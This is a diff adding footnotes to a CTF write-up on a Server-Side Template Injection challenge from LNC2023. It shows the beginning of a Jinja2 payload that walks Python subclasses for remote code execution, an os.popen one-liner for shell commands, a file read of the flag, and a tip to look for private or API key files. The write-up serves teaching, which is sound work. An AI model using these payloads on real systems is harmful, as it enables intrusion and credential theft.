@@ -35,9 +35,9 @@ However, if we view the source, we can see a debug section that was supposed to 
                 </div> -->
 ```
 
-It appears that the debug field is vulnerable to Server-Side Template Injection (SSTI).
+It appears that the debug field is vulnerable to Server-Side Template Injection (SSTI) [^1].
 
-We can use a payload to gain Python RCE into the system:
+We can use a payload to gain Python RCE into the system: [^2]
 ```
 {% for c in [].__class__.__base__.__subclasses__() %}
   {% if c.__name__ == 'catch_warnings' %}
@@ -58,7 +58,7 @@ The output shows:
 
 It appears that we are in the root directory.
 
-After searching around for quite some time, I found the flag in `/www/flag.txt`:
+After searching around for quite some time, I found the flag in `/www/flag.txt` [^3]:
 ```python
 open("/www/flag.txt").read()
 ```
@@ -69,3 +69,6 @@ And we got the flag!
 
 `LNC2023{T3mpl4t35_4r3_c00L_bUt_d4nG3r0u5_776843}`
 
+[^1]: More info on SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+[^2]: This exploit uses Python3 RCE. You can also choose to open a shell with `__import__("os").popen("<shell statement here>").read()`
+[^3]: When finding the flags for such challenges, it may be located in non-standard locations, and you may have to search a little. `ls *` is a way you can list all files, even those nested in directories. If you cannot find anything, try looking for clues in the machine (e.g. private key/API key file)
